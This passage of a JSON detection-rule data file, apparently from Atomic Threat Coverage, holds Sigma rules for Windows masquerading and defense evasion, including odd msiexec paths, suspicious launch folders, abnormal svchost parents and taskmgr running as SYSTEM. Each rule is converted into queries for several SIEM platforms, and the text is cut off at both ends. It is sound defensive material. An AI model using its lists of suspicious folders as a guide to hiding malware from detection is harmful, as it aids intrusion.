\"(Image.keyword:*\\\\\\\\\\\\\\\\msiexec.exe AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\WinSxS\\\\\\\\\\\\\\\\*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\msiexec.exe AND (NOT (Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\SysWOW64\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\WinSxS\\\\\\\\\\\\\\\\*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious MsiExec Directory\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\msiexec.exe AND (NOT (Image.keyword:(C\\\\:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\msiexec.exe\" NOT ((Image=\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\msiexec.exe\"  -(Image IN [\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\WinSxS\\\\\\\\*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\msiexec\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*C:\\\\Windows\\\\System32\\\\\\\\.*|.*C:\\\\Windows\\\\SysWOW64\\\\\\\\.*|.*C:\\\\Windows\\\\WinSxS\\\\\\\\.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Program Location Process Starts\nid: f50bfd8b-e2a3-4c15-9373-7900b5a4c6d5\nstatus: experimental\ndescription: Detects programs running in suspicious files system locations\nreferences:\n    - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2019/01/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\$Recycle.bin'\n            - '*\\Users\\Public\\\\*'\n            - 'C:\\Perflogs\\\\*'\n            - '*\\Windows\\Fonts\\\\*'\n            - '*\\Windows\\IME\\\\*'\n            - '*\\Windows\\addins\\\\*'\n            - '*\\Windows\\debug\\\\*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Program Location Process Starts\nid: f50bfd8b-e2a3-4c15-9373-7900b5a4c6d5\nstatus: experimental\ndescription: Detects programs running in suspicious files system locations\nreferences:\n    - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2019/01/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\$Recycle.bin'\n            - '*\\Users\\Public\\\\*'\n            - 'C:\\Perflogs\\\\*'\n            - '*\\Windows\\Fonts\\\\*'\n            - '*\\Windows\\IME\\\\*'\n            - '*\\Windows\\addins\\\\*'\n            - '*\\Windows\\debug\\\\*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:(*\\\\\\\\$Recycle.bin OR *\\\\\\\\Users\\\\\\\\Public\\\\\\\\* OR C\\\\:\\\\\\\\Perflogs\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\IME\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\addins\\\\\\\\* OR *\\\\\\\\Windows\\\\\\\\debug\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Program-Location-Process-Starts <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Program Location Process Starts\",\\n    \"description\": \"Detects programs running in suspicious files system locations\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"Image.keyword:(*\\\\\\\\\\\\\\\\$Recycle.bin OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Perflogs\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\IME\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\debug\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:(*\\\\\\\\\\\\\\\\$Recycle.bin OR *\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Perflogs\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Fonts\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\IME\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\debug\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Program Location Process Starts\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:(*\\\\\\\\$Recycle.bin *\\\\\\\\Users\\\\\\\\Public\\\\\\\\* C\\\\:\\\\\\\\Perflogs\\\\\\\\* *\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\* *\\\\\\\\Windows\\\\\\\\IME\\\\\\\\* *\\\\\\\\Windows\\\\\\\\addins\\\\\\\\* *\\\\\\\\Windows\\\\\\\\debug\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\$Recycle.bin\" OR Image=\"*\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\" OR Image=\"C:\\\\\\\\Perflogs\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\IME\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\" OR Image=\"*\\\\\\\\Windows\\\\\\\\debug\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\$Recycle.bin\", \"*\\\\\\\\Users\\\\\\\\Public\\\\\\\\*\", \"C:\\\\\\\\Perflogs\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\Fonts\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\IME\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\", \"*\\\\\\\\Windows\\\\\\\\debug\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\\\\\$Recycle\\\\.bin|.*.*\\\\Users\\\\Public\\\\\\\\.*|.*C:\\\\Perflogs\\\\\\\\.*|.*.*\\\\Windows\\\\Fonts\\\\\\\\.*|.*.*\\\\Windows\\\\IME\\\\\\\\.*|.*.*\\\\Windows\\\\addins\\\\\\\\.*|.*.*\\\\Windows\\\\debug\\\\\\\\.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Process Start Locations\nid: 15b75071-74cc-47e0-b4c6-b43744a62a2b\ndescription: Detects suspicious process run from unusual locations\nstatus: experimental\nreferences:\n    - https://car.mitre.org/wiki/CAR-2013-05-002\nauthor: juju4\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - car.2013-05-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*:\\RECYCLER\\\\*'\n            - '*:\\SystemVolumeInformation\\\\*'\n            - 'C:\\\\Windows\\\\Tasks\\\\*'\n            - 'C:\\\\Windows\\\\debug\\\\*'\n            - 'C:\\\\Windows\\\\fonts\\\\*'\n            - 'C:\\\\Windows\\\\help\\\\*'\n            - 'C:\\\\Windows\\\\drivers\\\\*'\n            - 'C:\\\\Windows\\\\addins\\\\*'\n            - 'C:\\\\Windows\\\\cursors\\\\*'\n            - 'C:\\\\Windows\\\\system32\\tasks\\\\*'\n            \n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Process Start Locations\nid: 15b75071-74cc-47e0-b4c6-b43744a62a2b\ndescription: Detects suspicious process run from unusual locations\nstatus: experimental\nreferences:\n    - https://car.mitre.org/wiki/CAR-2013-05-002\nauthor: juju4\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - car.2013-05-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*:\\RECYCLER\\\\*'\n            - '*:\\SystemVolumeInformation\\\\*'\n            - 'C:\\\\Windows\\\\Tasks\\\\*'\n            - 'C:\\\\Windows\\\\debug\\\\*'\n            - 'C:\\\\Windows\\\\fonts\\\\*'\n            - 'C:\\\\Windows\\\\help\\\\*'\n            - 'C:\\\\Windows\\\\drivers\\\\*'\n            - 'C:\\\\Windows\\\\addins\\\\*'\n            - 'C:\\\\Windows\\\\cursors\\\\*'\n            - 'C:\\\\Windows\\\\system32\\tasks\\\\*'\n            \n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:(*\\\\:\\\\\\\\RECYCLER\\\\\\\\* OR *\\\\:\\\\\\\\SystemVolumeInformation\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\debug\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\fonts\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\help\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\drivers\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\cursors\\\\\\\\* OR C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Process-Start-Locations <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Process Start Locations\",\\n    \"description\": \"Detects suspicious process run from unusual locations\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\",\\n      \"car.2013-05-002\"\\n    ],\\n    \"query\": \"Image.keyword:(*\\\\\\\\:\\\\\\\\\\\\\\\\RECYCLER\\\\\\\\\\\\\\\\* OR *\\\\\\\\:\\\\\\\\\\\\\\\\SystemVolumeInformation\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Tasks\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\debug\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\fonts\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\help\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\drivers\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\cursors\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\tasks\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:(*\\\\\\\\:\\\\\\\\\\\\\\\\RECYCLER\\\\\\\\\\\\\\\\* OR *\\\\\\\\:\\\\\\\\\\\\\\\\SystemVolumeInformation\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Tasks\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\debug\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\fonts\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\help\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\drivers\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\addins\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\cursors\\\\\\\\\\\\\\\\* OR C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\tasks\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Process Start Locations\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:(*\\\\:\\\\\\\\RECYCLER\\\\\\\\* *\\\\:\\\\\\\\SystemVolumeInformation\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\debug\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\fonts\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\help\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\drivers\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\cursors\\\\\\\\* C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*:\\\\\\\\RECYCLER\\\\\\\\*\" OR Image=\"*:\\\\\\\\SystemVolumeInformation\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\debug\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\fonts\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\help\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\drivers\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\cursors\\\\\\\\*\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*:\\\\\\\\RECYCLER\\\\\\\\*\", \"*:\\\\\\\\SystemVolumeInformation\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\debug\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\fonts\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\help\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\drivers\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\cursors\\\\\\\\*\", \"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\tasks\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*:\\\\RECYCLER\\\\\\\\.*|.*.*:\\\\SystemVolumeInformation\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\debug\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\fonts\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\help\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\drivers\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\addins\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\cursors\\\\\\\\.*|.*C:\\\\\\\\Windows\\\\\\\\system32\\\\tasks\\\\\\\\.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Svchost Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: experimental\ndescription: Detects a suspicious svchost process start\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2017/08/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\svchost.exe'\n    filter:\n        ParentImage:\n            - '*\\services.exe'\n            - '*\\MsMpEng.exe'\n            - '*\\Mrt.exe'\n            - '*\\rpcnet.exe'\n            - '*\\svchost.exe'\n    filter_null:\n        ParentImage: null\n    condition: selection and not filter and not filter_null\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Svchost Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: experimental\ndescription: Detects a suspicious svchost process start\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2017/08/15\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\svchost.exe'\n    filter:\n        ParentImage:\n            - '*\\services.exe'\n            - '*\\MsMpEng.exe'\n            - '*\\Mrt.exe'\n            - '*\\rpcnet.exe'\n            - '*\\svchost.exe'\n    filter_null:\n        ParentImage: null\n    condition: selection and not filter and not filter_null\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\svchost.exe AND (NOT (ParentImage.keyword:(*\\\\\\\\services.exe OR *\\\\\\\\MsMpEng.exe OR *\\\\\\\\Mrt.exe OR *\\\\\\\\rpcnet.exe OR *\\\\\\\\svchost.exe)))) AND (NOT (NOT _exists_:ParentImage)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Svchost-Process <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Svchost Process\",\\n    \"description\": \"Detects a suspicious svchost process start\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\svchost.exe AND (NOT (ParentImage.keyword:(*\\\\\\\\\\\\\\\\services.exe OR *\\\\\\\\\\\\\\\\MsMpEng.exe OR *\\\\\\\\\\\\\\\\Mrt.exe OR *\\\\\\\\\\\\\\\\rpcnet.exe OR *\\\\\\\\\\\\\\\\svchost.exe)))) AND (NOT (NOT _exists_:ParentImage)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\svchost.exe AND (NOT (ParentImage.keyword:(*\\\\\\\\\\\\\\\\services.exe OR *\\\\\\\\\\\\\\\\MsMpEng.exe OR *\\\\\\\\\\\\\\\\Mrt.exe OR *\\\\\\\\\\\\\\\\rpcnet.exe OR *\\\\\\\\\\\\\\\\svchost.exe)))) AND (NOT (NOT _exists_:ParentImage)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Svchost Process\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\svchost.exe AND (NOT (ParentImage.keyword:(*\\\\\\\\services.exe *\\\\\\\\MsMpEng.exe *\\\\\\\\Mrt.exe *\\\\\\\\rpcnet.exe *\\\\\\\\svchost.exe)))) AND (NOT (NOT _exists_:ParentImage)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\svchost.exe\" NOT ((ParentImage=\"*\\\\\\\\services.exe\" OR ParentImage=\"*\\\\\\\\MsMpEng.exe\" OR ParentImage=\"*\\\\\\\\Mrt.exe\" OR ParentImage=\"*\\\\\\\\rpcnet.exe\" OR ParentImage=\"*\\\\\\\\svchost.exe\"))) NOT (NOT ParentImage=\"*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\svchost.exe\"  -(ParentImage IN [\"*\\\\\\\\services.exe\", \"*\\\\\\\\MsMpEng.exe\", \"*\\\\\\\\Mrt.exe\", \"*\\\\\\\\rpcnet.exe\", \"*\\\\\\\\svchost.exe\"]))  -(-ParentImage=*))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*.*\\\\svchost\\\\.exe)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\services\\\\.exe|.*.*\\\\MsMpEng\\\\.exe|.*.*\\\\Mrt\\\\.exe|.*.*\\\\rpcnet\\\\.exe|.*.*\\\\svchost\\\\.exe)))))))(?=.*(?!.*(?:.*(?=.*(?!ParentImage))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Taskmgr as LOCAL_SYSTEM\nid: 9fff585c-c33e-4a86-b3cd-39312079a65f\nstatus: experimental\ndescription: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2018/03/18\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User: NT AUTHORITY\\SYSTEM\n        Image: '*\\taskmgr.exe'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Taskmgr as LOCAL_SYSTEM\nid: 9fff585c-c33e-4a86-b3cd-39312079a65f\nstatus: experimental\ndescription: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: Florian Roth\ndate: 2018/03/18\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User: NT AUTHORITY\\SYSTEM\n        Image: '*\\taskmgr.exe'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\" AND Image.keyword:*\\\\\\\\taskmgr.exe)", "product": "Atomic Threat 